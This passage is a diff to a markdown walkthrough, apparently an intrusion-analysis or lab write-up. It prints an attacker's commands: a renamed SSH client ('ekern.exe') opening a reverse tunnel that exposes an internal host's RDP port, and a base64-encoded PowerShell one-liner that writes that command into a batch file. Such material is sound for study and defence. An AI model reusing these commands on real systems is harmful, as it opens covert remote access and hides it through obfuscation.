@@ -142,7 +142,15 @@
    g. let's write FXS.bat file to run `ekern.exe` and establish reverse SSH Connection to RDP
 
       echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@n't_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.145:3389 192.168.1.2
-      
+
+   h. another base64? no need to download it
+
+      -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxXaW5kb3dzXFRlbXBcRlhTLmJhdCcNClNldC1Db250ZW50IC1QYXRoICRiYXRjaEZpbGVQYXRoIC1WYWx1ZSAkYmF0Y2hDb250ZW50')) | Invoke-Expression}"
+   
+   ![FXS](https://github.com/user-attachments/assets/80d229df-8c50-4153-8259-807ffb44a8e7)
+
+   j. let's run it now
+
 ------
 
 # Trash
